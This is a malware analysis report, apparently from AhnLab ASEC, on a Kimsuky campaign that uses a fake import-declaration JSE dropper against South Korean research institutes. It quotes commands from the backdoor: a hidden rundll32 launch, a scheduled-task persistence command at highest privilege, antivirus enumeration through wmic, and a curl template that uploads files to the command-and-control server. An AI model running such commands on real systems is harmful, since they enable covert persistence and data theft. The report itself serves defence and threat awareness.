Kimsuky Targets South Korean Research Institutes with Fake
Import Declaration
By kwonxx ⋮ ⋮ 11/30/2023
AhnLab Security Emergency response Center (ASEC) has recently identified that the Kimsuky threat group is
distributing a malicious JSE file disguised as an import declaration to research institutes in South Korea. The threat
actor ultimately uses a backdoor to steal information and execute commands.
The file name of the dropper disguised as an import declaration is as follows.
Import Declaration_Official Stamp Affixed.jse
The file contains an obfuscated PowerShell script, a Base64-encoded backdoor file, and a legitimate PDF file.

A legitimate PDF file is saved under the file name ‘Import Declaration.PDF’ and automatically executed by the
PowerShell script. This file contains the attack target’s information. Creating and executing a legitimate PDF file is
likely done to prevent users from recognizing that a malicious backdoor file is being executed in the process.

In the background, a backdoor is created in the %ProgramData% path under the file name ‘vuVvMKg.i3IO’, and the
malware is run using rundll32.exe.
powershell.exe -windowstyle hidden rundll32.exe ProgramData\\vuVuMKg.i3IO UpdateSystem
The malware copies itself into the %ProgramData% and %Public% paths under the file name ‘IconCache.db’ for
persistence before registering itself to the task scheduler.
cmd.exe /c schtasks /create /tn iconcache /tr “rundll32.exe C:\Programdata\IconCache.db UpdateSystem /sc
onlogon /rl highest /f
To exfiltrate system information, the backdoor uses the wmic command to check the anti-malware status of the attack
target and collects network information through the ipconfig command.
cmd.exe /U /c wimc /namespace:\\root\securitycenter2 path antivirusproduct get displayname > vaccine.txt
ipconfig /all
Afterwards, information such as the host name, user name, and OS information is collected. For the malware to avoid
detection, it encodes the command execution results and sends them to the C2.

Also, the following commands (including system information exfiltration) are run, behaving as a backdoor in the
affected system. Additionally, the curl tool is used to upload information to the C2 server.
getinfo: System information
die: Terminate
where: Execution path
run: Run certain files and commands
curl -k -F “fileToUpload=@%s” -F “id=%S” %s
Because the bait file is also run, users cannot recognize that their systems are infected by malware. As these types of
malware mainly attack specific targets, users should refrain from running attachments in emails sent from unknown
sources.
